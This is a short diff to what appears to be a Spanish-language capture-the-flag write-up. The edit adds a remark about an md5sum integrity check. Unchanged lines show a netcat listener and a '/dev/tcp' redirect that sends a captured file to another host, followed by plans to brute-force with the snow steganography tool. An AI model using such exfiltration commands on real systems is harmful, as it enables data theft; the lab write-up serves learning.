@@ -247,7 +247,7 @@ nc -lvnp 1337 > miletra.txt
 ```bash
 cat miletra.txt > /dev/tcp/172.17.0.1/1337
 ```
-y parece que funciona, ahora tenemos que correr snow y hacer fuerzabruta
+y parece que funciona,no obstante comprobé con md5sum la integridad de la data y estaba bien, ahora tenemos que correr snow y hacer fuerzabruta
 descargo snow de esta página:
 ```bash
 https://darkside.com.au/snow/
